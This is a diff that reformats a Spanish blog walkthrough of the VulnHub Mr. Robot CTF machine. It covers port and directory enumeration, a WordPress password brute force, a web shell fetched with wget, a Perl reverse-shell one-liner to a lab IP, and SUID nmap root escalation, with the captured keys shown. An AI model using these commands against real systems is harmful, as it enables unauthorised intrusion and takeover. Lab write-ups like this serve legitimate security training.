@@ -12,14 +12,17 @@ Para empezar nos descargamos la VM del siguiente <a href="https://www.vulnhub.co
 Una vez descargada y importada la maquina en VirtualBox empezamos con la enumeración de elementos de la máquina.
 <h2>Enumeración</h2>
 Lo primero que haremos es listar todo los puertos abiertos:
-<pre>root@kali:~# nmap -p- 172.31.255.128
+```
+root@kali:~# nmap -p- 172.31.255.128
 PORT STATE SERVICE
 22/tcp closed ssh
 80/tcp open http
 443/tcp open https
-MAC Address: 08:00:27:F3:16:D5 (Oracle VirtualBox virtual NIC)</pre>
+MAC Address: 08:00:27:F3:16:D5 (Oracle VirtualBox virtual NIC)
+```
 Con la opción -A nos da más información acerca de los servicios que se encuentran escuchando:
-<pre>root@kali:~# nmap -A 172.31.255.128
+```
+root@kali:~# nmap -A 172.31.255.128
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-12 15:50 CET
 Nmap scan report for 172.31.255.128
 Host is up (0.00040s latency).
@@ -47,11 +50,13 @@ HOP RTT ADDRESS
 1 0.40 ms 172.31.255.128
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 20.99 seconds</pre>
-&nbsp;
+Nmap done: 1 IP address (1 host up) scanned in 20.99 seconds
+```
+
 
 Vemos que solo tiene abierto los puertos 80,443 y el SSH se encuentra cerrado. Ahora vamos a listar los posibles directorios:
-<pre>root@kali:/usr/local/src/Osmedeus# ./osmedeus.py -m dir -t http://172.31.255.128
+```
+root@kali:/usr/local/src/Osmedeus# ./osmedeus.py -m dir -t http://172.31.255.128
 
 200 1KB http://172.31.255.128:80/admin/
 200 1KB http://172.31.255.128:80/admin/?/login
@@ -95,12 +100,16 @@ page
 Robot
 Elliot
 styles
-and</pre>
+and
+```
 Y el segundo la primera key:
-<pre>http://172.31.255.128/key-1-of-3.txt
-073403c8a58a1f80d943455fb30724b9</pre>
+```
+http://172.31.255.128/key-1-of-3.txt
+073403c8a58a1f80d943455fb30724b9
+```
 Con wpscan escanemos las posibles vulnerabilidades de wordpress pero parece que no encontramos nada:
-<pre>root@kali:~# wpscan --force --wp-content-dir wp-admin --url http://172.31.255.128
+```
+root@kali:~# wpscan --force --wp-content-dir wp-admin --url http://172.31.255.128
 _______________________________________________________________
 __ _______ _____
 \ \ / / __ \ / ____|
@@ -167,15 +176,16 @@ Checking Config Backups - Time: 00:00:00 &lt;===================================
 [+] Data Sent: 9.665 KB
 [+] Data Received: 186.248 KB
 [+] Memory used: 47.199 MB
-[+] Elapsed time: 00:00:02</pre>
-&nbsp;
+[+] Elapsed time: 00:00:02
+```
 
 Si accedemos al login de wordpress y probamos de acceder con el usuario elliot, que aparece en el diccionario, nos muestra el siguiente mensaje:
 
 <img class="size-medium wp-image-125 aligncenter" src="https://labs.dokistudio.es/wp-content/uploads/2018/12/01-276x300.png" alt="" width="276" height="300" />
 <h2>Explotación</h2>
 Ya tenemos el usuario solo nos hace falta el password. Con nmap lanzamos un ataque de bruteforce contra el login de wordpress, utilizando como diccionario de password el fichero "fsocity.dic" y como usuario "user.txt" que sólo contiene el usuario "elliot":
-<pre>root@kali:/tmp# cat user.txt
+```
+root@kali:/tmp# cat user.txt
 elliot
 
 root@kali:/tmp# nmap -sV -p 80 --script http-wordpress-brute -script-args 'passdb=/tmp/fsocity.dic,userdb=/tmp/user.txt' 172.31.255.128
@@ -195,7 +205,7 @@ MAC Address: 08:00:27:F3:16:D5 (Oracle VirtualBox virtual NIC)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 236.81 seconds
 
-</pre>
+```
 Ahora que tenemos las credenciales ya podemos acceder al panel de gestión de wordpress:
 
 <img class="aligncenter wp-image-126 size-large" src="https://labs.dokistudio.es/wp-content/uploads/2018/12/03-1024x409.png" alt="" width="676" height="270" />
@@ -211,9 +221,9 @@ Una vez guardados los cambios, accederemos vía web al archivo modificado:
 <img class="wp-image-128 size-large aligncenter" src="https://labs.dokistudio.es/wp-content/uploads/2018/12/05-1024x586.png" alt="" width="676" height="387" />
 
 Esta terminal es muy limitada así que vamos a subir otra, desde la propia terminal que acabamos de instalar ejecutamos el siguiente comando:
-<pre>wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O wp-content/themes/shell.php
-
-</pre>
+```
+wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O wp-content/themes/shell.php
+```
 Si accedemos vía web ya nos muestra la nueva shell:
 
 &nbsp;
@@ -221,29 +231,39 @@ Si accedemos vía web ya nos muestra la nueva shell:
 <img class="wp-image-129 size-large aligncenter" src="https://labs.dokistudio.es/wp-content/uploads/2018/12/07-1024x713.png" alt="" width="676" height="471" />
 <h2>Escalar  privilegios</h2>
 Ya tenemos acceso al sistema, el siguiente paso es escalar privilegios hasta llegar a root. Primero listamos con qué usuario estamos logueado:
-<pre>id
-uid=1(daemon) gid=1(daemon) groups=1(daemon)</pre>
+```
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
 Buscamos su home:
-<pre>grep daemon /etc/passwd
+```
+grep daemon /etc/passwd
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false</pre>
+ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+```
 El servidor SSH se encuentra instalado, pero no iniciado:
-<pre>dpkg -l | grep ssh
+
+```
+dpkg -l | grep ssh
 ii openssh-client 1:6.6p1-2ubuntu2 amd64 secure shell (SSH) client, for secure access to remote machines
 ii openssh-server 1:6.6p1-2ubuntu2 amd64 secure shell (SSH) server, for secure access from remote machines
 ii openssh-sftp-server 1:6.6p1-2ubuntu2 amd64 secure shell (SSH) sftp server module, for SFTP access from remote machines
 ii ssh 1:6.6p1-2ubuntu2 all secure shell client and server (metapackage)
 ii ssh-import-id 3.21-0ubuntu1 all securely retrieve an SSH public key and install it locally</pre>
-<pre>netstat -nltp
+
+netstat -nltp
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
 tcp 0 0 127.0.0.1:21 0.0.0.0:* LISTEN -
 tcp 0 0 127.0.0.1:2812 0.0.0.0:* LISTEN -
 tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN -
 tcp6 0 0 :::443 :::* LISTEN -
-tcp6 0 0 :::80 :::* LISTEN -</pre>
+tcp6 0 0 :::80 :::* LISTEN -
+```
+
 Buscamos binarios con SUID configurado y encontramos nmap:
-<pre>find / -perm -u=s -type f 2&gt;/dev/null
+```
+find / -perm -u=s -type f 2&gt;/dev/null
 /bin/ping
 /bin/umount
 /bin/mount
@@ -264,15 +284,19 @@ Buscamos binarios con SUID configurado y encontramos nmap:
 
 ls -liath /usr/local/bin/nmap
 34835 -rwsr-xr-x 1 root root 493K Nov 13 2015 /usr/local/bin/nmap
-
-</pre>
+```
 Ejecutamos una reverse shell, en nuestra máquina Kali ponemos a escuchar un netcat por el puerto 8080:
-<pre>root@kali:/tmp# nc -vlp 8080
-listening on [any] 8080 ...</pre>
+```
+root@kali:/tmp# nc -vlp 8080
+listening on [any] 8080 ...
+```
 Desde la maquina victima, vía la web shell:
-<pre>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.31.255.129:8080");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</pre>
+```
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.31.255.129:8080");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+```
 Ya tenemos una sesión abierta directamente desde nuestro kali:
-<pre>root@kali:/tmp# nc -vlp 8080
+```
+root@kali:/tmp# nc -vlp 8080
 listening on [any] 8080 ...
 
 172.31.255.128: inverse host lookup failed: Unknown host
@@ -283,26 +307,33 @@ index.php
 shell.php
 twentyfifteen
 twentyfourteen
-twentythirteen</pre>
+twentythirteen
+```
 Abrimos una shell en python:
-<pre>python -c 'import pty;pty.spawn("/bin/bash")'
-daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/themes$</pre>
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/themes$
+```
 Probamos de ejecutar nmap en modo interactivo y abrimos una shell:
-<pre>daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/themes$ /usr/local/bin/nmap --interactive
+```
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/themes$ /usr/local/bin/nmap --interactive
 &lt;pps/wordpress/htdocs/wp-content/themes$ /usr/local/bin/nmap --interactive
 
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h &lt;enter&gt; for help
 nmap&gt; !sh
 !sh
-</pre>
+```
 Bingo! ya tenemos acceso root:
-<pre># id
+```
+# id
 id
 uid=1(daemon) gid=1(daemon) <strong>euid=0(root) groups=0(root)</strong>,1(daemon)
-#</pre>
+#
+```
 En la home del usuario robot encontramos la key 2 de 3:
-<pre>cd /home/robot
+```
+cd /home/robot
 # ls
 ls
 key-2-of-3.txt password.raw-md5
@@ -316,9 +347,11 @@ total 16K
 # cat key-2-of-3.txt
 cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
-#</pre>
+#
+```
 Si desencriptamos el password:
-<pre>c3fcd3d76192e4007dfb496cca67e13b : abcdefghijklmnopqrstuvwxyz</pre>
+```
+c3fcd3d76192e4007dfb496cca67e13b : abcdefghijklmnopqrstuvwxyz</pre>
 Accedemos al directorio root y encontramos la última key:
 <pre>cd /root
 # pwd
@@ -336,7 +369,7 @@ total 32K
 35943 -rw-r--r-- 1 root root 3.2K Sep 16 2015 .bashrc
 34851 -rw------- 1 root root 1.0K Sep 16 2015 .rnd
 35944 -rw-r--r-- 1 root root 140 Feb 20 2014 .profile
-</pre>
+```
 <h1>Conclusiones</h1>
 Como he comentado al principio de la entrada, existen diferentes métodos para resolver un CTF. Después encontré esta <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">reverse shell php</a>, que podría haber subido directamente en vez de las dos shells anteriores.
 
